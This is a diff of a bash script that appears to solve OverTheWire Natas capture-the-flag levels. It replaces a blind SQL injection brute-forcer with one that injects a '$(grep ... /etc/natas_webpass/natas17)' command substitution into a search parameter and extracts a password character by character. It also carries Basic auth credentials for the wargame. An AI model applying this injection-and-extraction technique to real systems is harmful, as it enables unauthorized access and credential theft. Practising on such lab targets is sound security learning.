@@ -28,28 +28,26 @@ do
   for CH in {{0..9},{a..z},{A..Z}}
   do
     PASSWORD[$i]=$CH
-    TESTSTRING=$(printf "%s" "${PASSWORD[@]}")
 
-    #
-    # our SQL injection is USERNAME='natas16" AND password LIKE BINARY "TESTSTRING%'
-    #
-    # SELECT * from users where username="natas16" AND password LIKE BINARY "TESTSTRING%"
-    #
-    export USERNAME="$( rawurlencode 'natas16" AND password LIKE BINARY "' )$TESTSTRING%"
+    GREP_BEG="$( rawurlencode '$(grep -E ^' )"
+    TESTSTRING=$(printf "%s" "${PASSWORD[@]}")
+    GREP_END="$( rawurlencode '.* /etc/natas_webpass/natas17)' )"
 
     # the last echo'ed $TESTSTRING would represent the working usr/passwd combo
     echo "PASSWORD: $TESTSTRING"
 
     curl --silent \
-      "http://natas15.natas.labs.overthewire.org/?username=$USERNAME&debug" \
-      -H 'Authorization: Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==' \
-      | grep "This user exists" >/dev/null
+      "http://natas16.natas.labs.overthewire.org/?needle=${GREP_BEG}${TESTSTRING}${GREP_END}zebras&submit=Search" \
+      -H 'Authorization: Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA==' \
+      | grep "zebras" >/dev/null
 
-    if [ $? -eq 0 ]; then
-      # if the string "This user exists." it means our user+pw combo worked
-      # and we can move onto the next character
+    if [ $? -ne 0 ]; then
+      # if the string "zebras" does NOT exist, that means our passwd file grep
+      # returned some output which would have tainted our zebra pattern causing
+      # the new pattern not to be found in "dictionary.txt" and we can move onto
+      #  the next character
       break;
     fi
   done
 
-done 
+done
